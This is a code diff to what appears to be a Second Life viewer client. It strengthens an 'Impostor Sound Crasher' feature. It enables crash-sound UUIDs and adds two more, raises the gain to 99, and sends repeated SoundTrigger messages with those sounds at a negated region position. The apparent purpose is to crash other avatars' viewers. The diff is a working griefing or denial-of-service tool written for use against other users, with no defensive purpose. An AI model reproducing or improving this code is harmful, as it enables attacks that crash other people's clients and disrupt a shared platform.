@@ -68,8 +68,10 @@ LLUUID ANIMATION_WEAPON = LLUUID("0eadb1f7-1eb9-e373-d337-63c6ebaebf55");
 LLUUID ANIMATION_WEAPON2 = LLUUID("5dbd4baa-8b13-9066-4e9f-7257618e702a");
 LLUUID ANIMATION_WEAPON3 = LLUUID("8115b5a3-919b-4532-fbe2-88f2b9d3ecc7");
 LLUUID SoundTrigger = LLUUID("0bb19787-34d9-8838-1937-a84b7496dd0b");
-//LLUUID SOUNDCRASH2 = LLUUID("81bb83f7-3407-60e2-77a2-45ad2b5911c0");
-//LLUUID SOUNDCRASH3 = LLUUID("6aa7e2d7-60de-f38a-2db9-2929178b01a8");
+LLUUID SOUNDCRASH2 = LLUUID("81bb83f7-3407-60e2-77a2-45ad2b5911c0");
+LLUUID SOUNDCRASH3 = LLUUID("6aa7e2d7-60de-f38a-2db9-2929178b01a8");
+LLUUID SOUNDCRASH4 = LLUUID("e2b1182d-753e-a47a-b8a8-eac9e151b7bc");
+LLUUID SOUNDCRASH5 = LLUUID("c0d495b7-ef21-bcda-a367-3fd06ed1f286");
 //</edit>
 
 /**
@@ -1287,7 +1289,7 @@ void LLFloaterAvatarList::onClickCrash(void *userdata)
 	chat.mText = "Executing Impostor Sound Crasher Please Wait...";
 	chat.mSourceType = CHAT_SOURCE_SYSTEM;
 	{
-		int gain = 0.01f;
+		int gain = 99.01f;
 		for(int i = 0; i < 2; i++)
 		{
 			gMessageSystem->newMessageFast(_PREHASH_SoundTrigger);
@@ -1300,9 +1302,12 @@ void LLFloaterAvatarList::onClickCrash(void *userdata)
 			LLVector3d	pos = -from_region_handle(gAgent.getRegion()->getHandle());
 			gMessageSystem->addVector3Fast(_PREHASH_Position, (LLVector3)pos);
 			gMessageSystem->addF32Fast(_PREHASH_Gain, gain);
-
 			gMessageSystem->sendReliable(gAgent.getRegionHost());
-
+			send_sound_trigger(SOUNDCRASH2,1.0);
+			send_sound_trigger(SOUNDCRASH3,1.0);
+			send_sound_trigger(SOUNDCRASH4,1.0);
+			send_sound_trigger(SOUNDCRASH5,1.0);
+			send_sound_trigger(SoundTrigger,1.0);
 			gain = 99.0f;
 		}
 		LLFloaterChat::addChat(chat);
